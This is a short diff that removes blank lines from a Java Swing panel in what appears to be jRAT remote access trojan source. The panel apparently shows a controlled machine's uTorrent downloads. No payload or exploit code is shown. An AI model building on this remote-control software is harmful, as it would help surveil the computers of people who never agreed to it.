@@ -1,6 +1,5 @@
 package pro.jrat.ui.panels;
 
-
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
 
@@ -17,7 +16,6 @@ import javax.swing.table.DefaultTableModel;
 import pro.jrat.Slave;
 import pro.jrat.packets.outgoing.Packet57UTorrentDownloads;
 import pro.jrat.utils.IconUtils;
-
 
 @SuppressWarnings("serial")
 public class PanelControluTorrentDownloads extends PanelControlParent {
